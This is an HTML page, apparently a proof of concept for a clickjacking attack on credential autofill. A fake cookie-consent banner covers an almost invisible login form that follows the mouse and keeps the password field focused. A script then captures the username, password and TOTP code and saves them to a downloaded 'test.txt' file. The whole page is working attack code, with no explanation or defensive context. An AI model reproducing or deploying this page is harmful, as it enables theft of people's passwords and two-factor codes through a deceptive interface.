<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy Consent</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }
        #popover {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 2147483647;
            pointer-events: none;
        }
        #cookie-dialog {
            position: relative;
            margin: 200px auto 0;
            width: 650px;
            max-width: 90%;
            background: #ffffff;
            padding: 12px 24px;
            border: 10px solid #5fa624;
            box-shadow: 1px 1px 10px 1px #333;
            z-index: 9999;
            text-align: left;
            pointer-events: auto;
        }
        #cookie-dialog h2 {
            font-size: 20px;
            line-height: 16px;
            font-weight: 700;
            margin: 10px 0 16px;
        }
        #cookie-dialog p {
            margin: 12px 0;
            line-height: 16px;
            font-size: 10pt;
        }
        #button-row {
            display: flex;
            justify-content: space-between;
            margin-right: 265px;
        }
        .btn {
            border: 1px solid #000000;
            color: #000000;
            background: #ffffff;
            padding: 7px 10px;
            text-decoration: none;
            cursor: pointer;
        }
        #accept-all {
            border: none;
            color: #ffffff;
            background: #5fa624;
        }
        #accept-all:hover, .btn:hover {
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div id="popover" popover="manual" style="display: none;">
        <div id="cookie-dialog">
            <h2>Privacy & Transparency</h2>
            <p>We use cookies to store and/or access information on a device. By clicking "Accept," you consent to the use of cookies for personalized ads and content measurement.</p>
            <p><span id="button-row">
                <button id="accept-all" class="btn">Accept</button>
                <button id="decline-all" class="btn">Decline</button>
            </span></p>
        </div>
    </div>

    <div id="loginform" style="position: fixed; top: 300px; left: 500px; z-index: 2147483647; opacity: 0.001;">
        <form method="post" name="login" action="/" id="login" onchange="getLoginData()">
            <input id="username" name="username" type="text" autocomplete="username">
            <input id="password" name="password" type="password" autocomplete="current-password" autofocus>
            <input id="totp" name="totp" type="text" autocomplete="one-time-code">
        </form>
    </div>

    <script>
        setTimeout(() => {
            const popover = document.getElementById('popover');
            popover.style.display = '';
            popover.showPopover();
        }, 1000);

        setTimeout(() => {
            document.getElementById('password').focus();
        }, 2000);

        function getLoginData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const totp = document.getElementById('totp').value;
            if (password) {
                // Create text content for test.txt
                const data = `Username: ${username}\nPassword: ${password}\nTOTP: ${totp}\n---\n`;
                
                // Create a Blob with the data
                const blob = new Blob([data], { type: 'text/plain' });
                
                // Create a temporary URL for the Blob
                const url = window.URL.createObjectURL(blob);
                
                // Create a link element to trigger download
                const a = document.createElement('a');
                a.href = url;
                a.download = 'test.txt';
                document.body.appendChild(a);
                a.click();
                
                // Clean up
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
                
                // Hide form and banner after data capture
                document.getElementById('loginform').style.display = 'none';
                document.getElementById('popover').style.display = 'none';
            }
        }

        document.addEventListener('mousemove', function (event) {
            const loginForm = document.getElementById('loginform');
            loginForm.style.top = `${event.pageY - 50}px`;
            loginForm.style.left = `${event.pageX - 100}px`;
            setTimeout(() => {
                document.getElementById('password').focus();
            }, 100);
        });
    </script>
</body>
</html>
